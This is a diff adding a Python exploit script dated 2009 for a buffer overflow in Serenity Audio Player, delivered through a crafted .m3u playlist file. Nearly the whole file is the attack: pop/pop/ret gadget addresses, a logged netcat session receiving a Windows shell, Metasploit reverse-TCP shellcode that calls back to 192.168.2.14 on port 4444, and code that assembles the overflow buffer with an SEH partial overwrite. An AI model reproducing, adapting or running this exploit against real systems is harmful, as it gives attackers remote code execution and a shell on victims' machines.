@@ -1,0 +1,89 @@
+#!/usr/bin/python
+#
+# ######################################################################
+#
+# Exploit Title     : Serenity Audio Player Playlist (.m3u) BOF
+# Discovered by	    : Rick from Corelan Team (ricks2600[at]gmail[dot]com)
+# Author            : mr_me
+# Author contact    : seeleymagic[at]hotmail[dot]com
+# Date              : nov 24th, 2009
+# Type              : local and remote code execution
+# OS                : Windows XP sp3
+# Product           : Serenity Audio Player
+# Version           : <= 3.2.3
+# Download          : http://malsmith.kyabram.biz/serenity/
+# Greetz	    : rick,edi,dellnull,marko T,phifli,corelanc0d3r
+# Visit		    : corelanc0d3r's blog http://www.corelan.be:8800/
+#
+# ######################################################################
+#
+# Description:
+#
+# Serenity is a playlist based audio player for Windows. It features a clean and simple
+# interface with minimal overhead. Formats supported are limited only by CODECs and
+# drivers installed on the machine.
+#
+# See the kind of p/p/r I have to deal with ? :P
+#
+# 0x004040e7 pop esi; pop ebp; retn 0x0010
+# 0x00404482 pop esi; pop ebp; retn 0x0010
+# 0x00404c95 pop ebx; pop ebp; retn 0x0010
+# 0x00404dd3 pop edi; pop esi; retn 0x0004
+# 0x004054cb pop esi; pop ebx; retn 0x0004
+# 0x00405543 pop edi; pop esi; retn 0x0004
+# 0x0040558b pop esi; pop ebx; retn 0x0008
+# 0x00405641 pop esi; pop ebp; retn 0x0008
+# 0x004057af pop ebp; pop ebx; retn 0x0008
+# 0x00405855 pop ebx; pop ebp; retn 0x0014
+# 0x00405bee pop esi; pop ebx; retn 0x0004
+#
+# Visit corelanc0d3r's blog: http://www.corelan.be:8800/
+#
+# mrme@home:~/serenity$ nc -lvp 4444
+# listening on [any] 4444 ...
+# 192.168.2.13: inverse host lookup failed: Unknown server error : Connection timed out
+# connect to [192.168.2.14] from (UNKNOWN) [192.168.2.13] 3761
+# Microsoft Windows XP [Version 5.1.2600]
+# (C) Copyright 1985-2001 Microsoft Corp.
+#
+# C:\Program Files\Serenity>
+
+# windows/shell_reverse_tcp - 287 bytes
+# http://www.metasploit.com
+# LHOST=192.168.2.14, EXITFUNC=seh, LPORT=4444
+
+sc =(
+"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24" +
+"\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f" +
+"\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84" +
+"\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28" +
+"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c" +
+"\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" +
+"\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e" +
+"\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" +
+"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50" +
+"\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff" +
+"\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43" +
+"\x53\x43\x53\xff\xd0\x68\xc0\xa8\x02\x0e\x66\x68\x11\x5c" +
+"\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff\xd6\x6a" +
+"\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a\x50" +
+"\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95" +
+"\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" +
+"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51" +
+"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05" +
+"\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6" +
+"\x79\xff\x75\x04\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a" +
+"\x04\x5f\x53\xff\xd6\xff\xd0");
+
+boom = ("http://");
+boom += ("\x41" * (992 -len(sc)-10));   # offset
+boom += ("\x90" * 10)                   # some nops just incase
+boom += (sc)                            # shellcode
+boom +=("\xe9\xd4\xfe\xff\xff")         # we're flying baby
+boom += ("\xeb\xf9\x90\x90")            # short jump back
+boom += ("\xe8\x47\x40");               # partial overwrite.. sneaky
+
+file=open('mr_me_owns_serenity.m3u','w')
+file.write(boom)
+file.close()
+print "[+] mr_me_owns_serenity.m3u file created successfully"
